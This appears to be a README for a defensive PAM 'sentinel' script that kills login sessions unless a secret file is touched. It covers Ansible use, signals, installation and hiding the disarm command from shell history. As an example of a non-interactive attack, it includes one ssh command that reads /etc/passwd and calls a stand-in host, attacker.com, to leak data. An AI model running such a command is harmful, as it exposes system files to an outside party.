STATE
=====

- [x] Works when logged in via `machinectl shell <machine>`
- [x] Works when logged in via `ssh user@host`
- [x] Works with Ansible (of course you need to disarm the sentinel, too)


NOTES
=====

How it works
------------

The script detaches itself from PAM's execution thread. 
PAM does its checks and hands control over to the user's shell.
In the meanwhile the script counts down silently in the background. 
If the timer runs out, the sentinel performs its check and if this fails 

Ansible
-------

Make sure that ansible passes the sentinel, too.

```yml
# safe_pass
- name: Pass sentinel
  tags: always
  ansible.builtin.file:
    path: PATH_TO_YOUR_SECRET_FILE
    state: touch
```

Processes
---------

**PAM_TTY** will be blank or completely unassigned during non-interactive automated actions that trigger a PAM session but don't allocate a terminal interface.

```sh
ssh user@server "cat /etc/passwd && curl http://attacker.com/leak"
# There is no interactive shell to log out of. The SSH daemon spawns the process directly, executes the string, and closes.
```

Signals
-------

**SIGHUP** or **SIGTERM** may be trapped and ignored.

**SIGKILL** is the only signal in Linux that cannot be caught, blocked, or ignored by a process. 
The moment the kernel sees a kill -9, it doesn't ask the process to close - it immediately wipes the process out of system memory.
This brings the risk of data corruption.

Therefore the script tries to terminate the processes with **SIGTERM** first.
After a small period **SIGKILL** is used to kill the remaining ones.

```sh
trap "echo I am not leaving" SIGHUP SIGTERM
```

INSTALL
=======

```sh
# /etc/pam.d/common-session
# at the bottom:
session optional pam_exec.so PATH_TO_YOUR_SCRIPT
```

Hide disarm cmd from history
----------------------------

Hide it by prepending whitespace (if you forget that it will be logged!).

### bash

```sh
# ~/.bashrc
HISTCONTROL=ignorespace # or 
HISTCONTROL=ignoreboth
```

### zsh

```sh
# ~/.zshrc
setopt HIST_IGNORE_SPACE
```
